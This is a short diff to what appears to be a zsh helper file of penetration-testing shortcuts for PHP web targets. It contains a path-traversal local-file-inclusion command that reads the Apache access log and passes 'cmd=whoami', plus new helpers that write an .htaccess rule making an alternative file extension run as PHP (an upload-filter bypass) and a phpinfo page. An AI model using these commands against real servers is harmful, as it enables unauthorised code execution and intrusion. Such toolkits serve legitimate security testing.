@@ -72,10 +72,12 @@ qq-enum-web-php-lfi-logfile() {
     print -z "curl -k -v ${u}../../../../../var/log/apache2/access.log&cmd=whoami"
 }
 
-qq-enum-web-php-notes-lfi-list() {
-    glow ${__NOTES}/enum-web-php-lfi-list.md
+qq-enum-web-php-gen-htaccess() {
+  local e && read "e?Extension: "
+  __info "Upload .htaccess file to make alt extension executable by PHP"
+  print -z "echo \"AddType application/x-httpd-php <extension>\" > htaccess"
 }
 
-qq-enum-web-php-notes-lfi-windows() {
-    glow ${__NOTES}/enum-web-php-lfi-windows.md
+qq-enum-web-php-phpinfo() {
+  print -z "echo \"<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>\" > phpinfo.php"
 }
